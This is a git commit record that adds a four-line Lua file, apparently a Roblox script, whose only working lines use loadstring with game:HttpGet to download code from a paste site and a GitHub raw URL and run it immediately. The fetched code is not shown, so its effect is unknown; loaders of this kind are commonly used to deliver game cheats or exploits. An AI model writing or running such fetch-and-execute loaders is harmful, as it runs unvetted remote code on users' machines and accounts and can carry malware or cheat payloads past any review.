4d7d14d7d2f332ab625196f64edfb7d96f5c47f7
Mark <jaimepersonal46@gmail.com>
2025-12-17 19:18:02 +0100

    Create Script.lua

---
+++ Script.lua
@@ -0,0 +1,4 @@
+-- Please Any Issues Report To Me With SS of the error --
+
+loadstring(game:HttpGet("https://paste-bin.xyz/raw/8216049", true))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/renardofficiel/game/refs/heads/main/loader.lua', true))()
